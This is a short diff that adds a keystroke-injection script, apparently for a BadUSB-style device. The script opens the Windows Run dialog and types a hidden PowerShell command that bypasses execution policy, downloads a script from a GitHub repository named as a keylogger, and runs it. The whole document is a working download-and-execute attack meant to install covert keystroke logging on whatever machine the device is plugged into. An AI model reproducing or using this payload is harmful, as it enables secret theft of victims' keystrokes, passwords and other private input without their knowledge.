@@ -1,0 +1,5 @@
+DELAY 200
+GUI r
+DELAY 300
+STRING powershell -w hidden -NoP -Ep Bypass -Command "iwr 'https://raw.githubusercontent.com/UnsavorySpirit/F0_KeyLogger/main/k.ps1' | iex"
+ENTER
